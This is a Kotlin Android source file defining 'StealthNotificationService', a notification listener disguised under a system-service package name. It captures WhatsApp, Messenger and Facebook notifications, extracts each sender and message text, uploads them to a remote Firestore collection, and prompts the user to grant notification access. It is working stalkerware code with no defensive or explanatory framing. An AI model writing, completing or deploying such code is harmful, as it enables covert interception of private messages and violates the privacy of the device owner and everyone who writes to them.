package com.example.systemservice

import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import android.widget.Toast
import androidx.core.app.NotificationManagerCompat
import com.google.firebase.firestore.FirebaseFirestore
import java.util.*

class StealthNotificationService : NotificationListenerService() {
    private val db = FirebaseFirestore.getInstance()
    private val targetPackages = setOf(
        "com.whatsapp",
        "com.facebook.orca", // Messenger
        "com.facebook.katana" // Facebook
    )

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        if (targetPackages.contains(sbn.packageName)) {
            val sender = sbn.notification.extras?.getString("android.title") ?: "Unknown"
            val message = sbn.notification.extras?.getString("android.text") ?: "No content"

            val data = hashMapOf(
                "app" to sbn.packageName,
                "sender" to sender,
                "message" to message,
                "timestamp" to Date()
            )

            db.collection("social_messages").add(data)
                .addOnFailureListener { e -> Log.e("GHOST", "Failed to log message", e) }
        }
    }

    fun checkAndRequestNotificationAccess(context: Context) {
        val enabledListeners = Settings.Secure.getString(
            context.contentResolver,
            "enabled_notification_listeners"
        )

        if (!enabledListeners.contains(context.packageName)) {
            val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
            Toast.makeText(context, "Please enable notification access for this app", Toast.LENGTH_LONG).show()
        }
    }
}